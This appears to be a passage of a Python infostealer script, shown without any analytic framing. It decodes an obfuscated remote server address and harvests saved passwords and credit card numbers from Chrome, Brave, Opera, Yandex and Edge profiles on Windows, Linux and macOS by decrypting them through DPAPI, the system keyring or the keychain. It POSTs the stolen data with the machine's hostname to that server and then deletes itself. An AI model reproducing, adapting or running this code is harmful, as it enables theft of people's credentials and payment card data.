        subprocess.check_call([sys.executable, _m, _pp, _inl, "secretstorage"])
        import secretstorage

sType = "5346"
gType = "brow"
home = os.path.expanduser("~")
ts = int(time.time() * 1000)
host = "LjE3LjI0OTUuMTY0"
# host="    AuMC4x    MTI3Lj"
hn = ""
if gType == "brow":
    hn = socket.gethostname()
else:
    hn = gType + "_" + socket.gethostname()

host1 = base64.b64decode(host[8:] + host[:8]).decode()
host2 = f"http://{host1}:1224"


class BrowserVersion:
    def __str__(A):
        return A.base_name

    def __eq__(A, __o):
        return A.base_name == __o


class Chrome(BrowserVersion):
    base_name = "chrome"
    v_w = ["chrome", "chrome dev", "chrome beta", "chrome canary"]
    v_l = ["google-chrome", "google-chrome-unstable", "google-chrome-beta"]
    v_m = ["chrome", "chrome dev", "chrome beta", "chrome canary"]


class Brave(BrowserVersion):
    base_name = "brave"
    v_w = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
    v_l = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
    v_m = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]


class Opera(BrowserVersion):
    base_name = "opera"
    v_w = ["Opera Stable", "Opera Next", "Opera Developer"]
    v_l = ["opera", "opera-beta", "opera-developer"]
    v_m = [
        "com.operasoftware.Opera",
        "com.operasoftware.OperaNext",
        "com.operasoftware.OperaDeveloper",
    ]


class Yandex(BrowserVersion):
    base_name = "yandex"
    v_w = ["YandexBrowser"]
    v_l = ["YandexBrowser"]
    v_m = ["YandexBrowser"]


class MsEdge(BrowserVersion):
    base_name = "msedge"
    v_w = ["Edge"]
    v_l = []
    v_m = []


available_browsers = [Chrome, Brave, Opera, Yandex, MsEdge]


class ChromeBase:
    def __init__(A, verbose=True, blank_passwords=False):
        A.verbose = verbose
        A.blank_passwords = blank_passwords
        A.values = []
        A.webs = []
        A.target_os = platform.system()

    @staticmethod
    def get_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    @staticmethod
    def get(func):
        """
        Update paths with the Chrome versions
        Will change protected members from child class.
        """

        def wrapper(*args):
            cls = args[0]
            sys_ = platform.system()
            base_name = cls.browser.base_name
            vers = None

            if sys_ == "Windows":
                vers = cls.browser.v_w
            elif sys_ == "Linux":
                vers = cls.browser.v_l
            elif sys_ == "Darwin":
                vers = cls.browser.v_m

            for ver in vers:
                for i in range(120):
                    if i == 0:
                        profile = "Default"
                    else:
                        profile = "Profile " + str(i)
                    # Accessing protected member to update the paths.
                    browser_path = cls.browsers_paths[base_name].format(
                        ver=ver, profile=profile
                    )
                    database_path = cls.browsers_database_paths[base_name].format(
                        ver=ver, profile=profile
                    )
                    browser_web_path = cls.browsers_web_paths[base_name].format(
                        ver=ver, profile=profile
                    )

                    if os.path.exists(browser_path) and os.path.exists(database_path):
                        cls._browser_paths.append(browser_path)
                        cls._database_paths.append(database_path)
                    if os.path.exists(browser_web_path):
                        cls._browser_web_paths.append(browser_web_path)

                return func(*args)

        return wrapper

    @staticmethod
    def decrypt_windows_password(password, key):
        0

    @staticmethod
    def decrypt_unix_password(password: bytes, key: bytes) -> str:
        """
        Decrypt Unix Chrome password
        Salt: The salt is â¬Üsaltysaltâ¬" (constant)
        Iterations: 1003(constant) for symmetric key derivation in macOS. 1 iteration in Linux.
        IV: 16 spaces.
        """
        try:
            iv = b" " * 16  # Initialization vector
            password = password[3:]  # Delete the 3 first chars
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)  # Create cipher
            return cipher.decrypt(password).strip().decode("utf8")
        except Exception:
            return ""

    def retrieve_database(self) -> list:
        """
        Retrieve all the information from the databases with encrypted values.
        """
        temp_path = (
            (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"
        )
        database_paths, keys = self.database_paths, self.keys
        try:
            for database_path in database_paths:  # Iterate on each available database
                # Copy the file to the temp directory as the database will be locked if the browser is running
                filename = os.path.join(temp_path, "LoginData.db")

                shutil.copyfile(database_path, filename)

                db = sqlite3.connect(filename)  # Connect to database
                cursor = db.cursor()  # Initialize cursor for the connection
                # Get data from the database
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
                )

                # Set default values. Some of the values from the database are not filled.
                creation_time = "unknown"
                last_time_used = "unknown"
                key = keys[database_paths.index(database_path)]

                # Iterate over all the rows
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    encrypted_password = row[3]
                    created = row[4]
                    lastused = row[5]

                    # Decrypt password
                    if self.target_os == "Windows":
                        password = self.decrypt_windows_password(
                            encrypted_password, key
                        )

                    elif self.target_os == "Linux" or self.target_os == "Darwin":
                        password = self.decrypt_unix_password(encrypted_password, key)

                    else:
                        password = ""

                    if password == "" and not self.blank_passwords:
                        continue

                    if created and created != 86400000000:
                        creation_time = str(self.__class__.get_datetime(created))
                    if lastused and lastused != 86400000000:
                        last_time_used = self.__class__.get_datetime(lastused)

                    # Append all values to list
                    self.values.append(
                        dict(
                            origin_url=origin_url,
                            action_url=action_url,
                            username=username,
                            password=password,
                            creation_time=creation_time,
                            last_time_used=last_time_used,
                        )
                    )

                cursor.close()
                db.close()
                try:
                    os.remove(filename)
                except OSError:
                    pass
            return self.values
        except Exception as E:
            return []

    def retrieve_web(self):

        web_paths, keys = self.browser_web_paths, self.keys
        temp_path = (
            (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"
        )

        try:
            for web_path in web_paths:
                filename = os.path.join(temp_path, "webdata.db")
                shutil.copyfile(web_path, filename)

                conn = sqlite3.connect(filename)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards"
                )

                key = keys[web_paths.index(web_path)]
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue

                    # Decrypt password
                    if self.target_os == "Windows":
                        card_number = self.decrypt_windows_password(row[3], key)
                    elif self.target_os == "Linux" or self.target_os == "Darwin":
                        card_number = self.decrypt_unix_password(row[3], key)
                    else:
                        card_number = ""

                    if card_number == "" and not self.blank_passwords:
                        continue

                    self.webs.append(
                        dict(
                            name_on_card=row[0],
                            expiration_month=row[1],
                            expiration_year=row[2],
                            card_number=card_number,
                            date_modified=row[4],
                        )
                    )

                cursor.close()
                conn.close()
                try:
                    os.remove(filename)
                except OSError:
                    pass
        except Exception as E:
            return []

    def pretty_print(self) -> str:
        """
        Return the pretty-printed values
        """
        o = ""
        for dict_ in self.values:
            for val in dict_:
                o += f"{val} : {dict_[val]}\n"
            o += "-" * 50 + "\n"

        for dict_ in self.webs:
            for val in dict_:
                o += f"{val} : {dict_[val]}\n"
            o += "-" * 50 + "\n"

        return o

    def save(
        self,
        fn: Union[Path, str],
        filepath: Union[Path, str],
        blank_file: bool = False,
        verbose: bool = True,
    ) -> bool:
        content = filepath + "\n" + self.pretty_print()
        options = {
            "ts": str(ts),
            "type": sType,
            "hid": hn,
            "ss": str(fn),
            "cc": content,
        }
        url = host2 + "/keys"
        try:
            requests.post(url, data=options)
        except:
            return ""


class Windows(ChromeBase):
    def __init__(
        self,
        browser: Type[BrowserVersion] = Chrome,
        verbose: bool = True,
        blank_passwords: bool = False,
    ):

        super(Windows, self).__init__(verbose, blank_passwords)
        self.browser = browser()
        # This is where all the paths for the installed browsers will be saved
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.keys = []
        base_path = home + "/AppData"

        self.browsers_paths = {
            "chrome": os.path.join(
                base_path, r"Local\\Google\\{ver}\\User Data\\Local State"
            ),
            "opera": os.path.join(
                base_path, r"Roaming\\Opera Software\\{ver}\\Local State"
            ),
            "brave": os.path.join(
                base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\Local State"
            ),
            "yandex": os.path.join(
                base_path, r"Local\\Yandex\\{ver}\\User Data\\Local State"
            ),
            "msedge": os.path.join(
                base_path, r"Local\\Microsoft\\{ver}\\User Data\\Local State"
            ),
        }
        self.browsers_database_paths = {
            "chrome": os.path.join(
                base_path, r"Local\\Google\\{ver}\\User Data\\{profile}\\Login Data"
            ),
            "opera": os.path.join(
                base_path, r"Roaming\\Opera Software\\{ver}{profile}\\Login Data"
            ),
            "brave": os.path.join(
                base_path,
                r"Local\\BraveSoftware\\{ver}\\User Data\\{profile}\\Login Data",
            ),
            "yandex": os.path.join(
                base_path, r"Local\\Yandex\\{ver}\\User Data\\{profile}\\Local State"
            ),
            "msedge": os.path.join(
                base_path, r"Local\\Microsoft\\{ver}\\User Data\\{profile}\\Login Data"
            ),
        }
        self.browsers_web_paths = {
            "chrome": os.path.join(
                base_path, r"Local\\Google\\{ver}\\User Data\\{profile}"
            ),
            "opera": os.path.join(
                base_path, r"Roaming\\Opera Software\\{ver}{profile}"
            ),
            "brave": os.path.join(
                base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\{profile}"
            ),
            "yandex": os.path.join(
                base_path, r"Local\\Yandex\\{ver}\\User Data\\{profile}"
            ),
            "msedge": os.path.join(
                base_path, r"Local\\Microsoft\\{ver}\\User Data\\{profile}"
            ),
        }

    @property
    def browser_paths(self):
        return self._browser_paths

    @property
    def database_paths(self):
        return self._database_paths

    @property
    def browser_web_paths(self):
        return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        """
        Return database paths and keys for Windows
        """
        # Get the AES key
        self.keys = [
            self.__class__.get_encryption_key(path) for path in self.browser_paths
        ]
        return self.database_paths, self.keys

    @staticmethod
    def get_encryption_key(path: Union[Path, str]):
        """
        Return the encryption key of a path
        """
        try:
            with open(path, "r", encoding="utf-8") as file:  # Open the "Local State"
                local_state = file.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return ""

    @staticmethod
    def decrypt_windows_password(password: bytes, key: bytes) -> str:
        try:
            # Get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # Generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # Decrypt password
            return cipher.decrypt(password)[:-16].decode()

        except Exception:
            try:
                return str(
                    win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                )
            except Exception:
                return ""


class Linux(ChromeBase):
    """Decryption class for Chrome in Linux OS"""

    def __init__(
        self,
        browser: Type[BrowserVersion] = Chrome,
        verbose: bool = False,
        blank_passwords: bool = False,
    ):

        super(Linux, self).__init__(verbose, blank_passwords)

        self.browser = browser()

        # This is where all the paths for the installed browsers will be saved
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.keys = []
        base_path = os.getenv("HOME")

        self.browsers_paths = {
            "chrome": base_path + "/.config/{ver}/{profile}",
            "opera": base_path + "/.config/{ver}{profile}",
            "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}",
            "yandex": "",
            "msedge": "",
        }
        self.browsers_database_paths = {
            "chrome": base_path + "/.config/{ver}/{profile}/Login Data",
            "opera": base_path + "/.config/{ver}{profile}/Login Data",
            "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}/Login Data",
            "yandex": "",
            "msedge": "",
        }
        self.browsers_web_paths = {
            "chrome": base_path + "/.config/{ver}/{profile}",
            "opera": base_path + "/.config/{ver}{profile}",
            "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}",
            "yandex": "",
            "msedge": "",
        }

    @property
    def browser_paths(self):
        return self._browser_paths

    @property
    def database_paths(self):
        return self._database_paths

    @property
    def browser_web_paths(self):
        return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        """
        Return database paths and keys for Linux
        """
        key = self.get_encryption_key()
        if not key:
            return [], []
        self.keys.append(key)
        return self.database_paths, self.keys

    def get_encryption_key(self) -> bytes:
        """
        Return the encryption key for the browser
        """
        try:
            label = "Chrome Safe Storage"  # Default
            # Some browsers have a different safe storage label
            if self.browser == "opera":
                label = "Chromium Safe Storage"
            elif self.browser == "brave":
                label = "Brave Safe Storage"
            elif self.browser == "yandex":
                label = "Yandex Safe Storage"

            # Default password is peanuts
            passw = "peanuts".encode("utf8")
            # New connection to session bus
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():  # Iterate
                if item.get_label() == label:
                    passw = item.get_secret().decode("utf-8")
                    break

            return PBKDF2(passw, b"saltysalt", 16, 1)
        except:
            return ""


class Mac(ChromeBase):
    """Decryption class for Chrome in MacOS"""

    def __init__(
        self,
        browser: Type[BrowserVersion] = Chrome,
        verbose: bool = True,
        blank_passwords: bool = False,
    ):
        """
        Decryption class for MacOS. Only tested in the macOS Monterrey version.
        :param browser: Choose which browser use. Available: "chrome" (default), "opera", and "brave".
        :param verbose: print output
        """

        super(Mac, self).__init__(verbose, blank_passwords)
        self.browser = browser()
        self.keys = []
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.browsers_paths = {
            "chrome": os.path.expanduser(
                "~/Library/Application Support/Google/{ver}/{profile}"
            ),
            "opera": os.path.expanduser("~/Library/Application Support/{ver}{profile}"),
            "brave": os.path.expanduser(
                "~/Library/Application Support/BraveSoftware/{ver}/{profile}"
            ),
            "yandex": "",
            "msedge": "",
        }

        self.browsers_database_paths = {
            "chrome": os.path.expanduser(
                "~/Library/Application Support/Google/{ver}/{profile}/Login Data"
            ),
            "opera": os.path.expanduser(
                "~/Library/Application Support/{ver}{profile}/Login Data"
            ),
            "brave": os.path.expanduser(
                "~/Library/Application Support/BraveSoftware/{ver}/{profile}/Login Data"
            ),
            "yandex": "",
            "msedge": "",
        }

        self.browsers_web_paths = {
            "chrome": os.path.expanduser(
                "~/Library/Application Support/Google/{ver}/{profile}"
            ),
            "opera": os.path.expanduser("~/Library/Application Support/{ver}{profile}"),
            "brave": os.path.expanduser(
                "~/Library/Application Support/BraveSoftware/{ver}/{profile}"
            ),
            "yandex": "",
            "msedge": "",
        }

    @property
    def browser_paths(self):
        return self._browser_paths

    @property
    def database_paths(self):
        return self._database_paths

    @property
    def browser_web_paths(self):
        return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        """
        Return database paths and keys for MacOS
        """
        key = self.get_encryption_key()
        if not key:
            return [], []

        # Decrypt the keychain key to a hex key
        self.keys.append(PBKDF2(key, b"saltysalt", 16, 1003, hmac_hash_module=SHA1))
        return self.database_paths, self.keys

    def get_encryption_key(self) -> Union[str, None]:
        """
        Return the encryption key for the browser

        Note: The system will notify the user and ask for permission
        even running as a sudo user as it's trying to access the keychain.
        """
        try:
            label = "Chrome"  # Default
            # Some browsers have a different safe storage label
            if self.browser == "opera":
                label = "Opera"
            elif self.browser == "brave":
                label = "Brave"
            elif self.browser == "yandex":
                label = "Yandex"

            # Run command
            # Note: this command will prompt a confirmation window
            safe_storage_key = subprocess.check_output(
                f"security 2>&1 > /dev/null find-generic-password -ga '{label}'",
                shell=True,
            )

            # Get key from the output
            return re.findall(r"\"(.*?)\"", safe_storage_key.decode("utf-8"))[0]
        except:
            return ""


if os_type == "Windows":
    oss = Windows
elif os_type == "Linux":
    oss = Linux
elif os_type == "Darwin":
    oss = Mac
else:
    dir = os.getcwd()
    os.remove(dir + "\%s" % sys.argv[0])
    sys.exit(-1)  # Clean exit
idx = 0
for br in available_browsers:
    pax = oss(br, blank_passwords=False)  # Class instance
    pax.fetch()  # Get database paths and keys
    pax.retrieve_database()  # Get the data from the database
    pax.retrieve_web()  # Get the data
    browser_path = home + f"/{br.base_name}"
    pax.save(f"s{idx}", browser_path, blank_file=False, verbose=True)
    idx += 1

dir = os.getcwd()
os.remove(dir + "\%s" % sys.argv[0])
```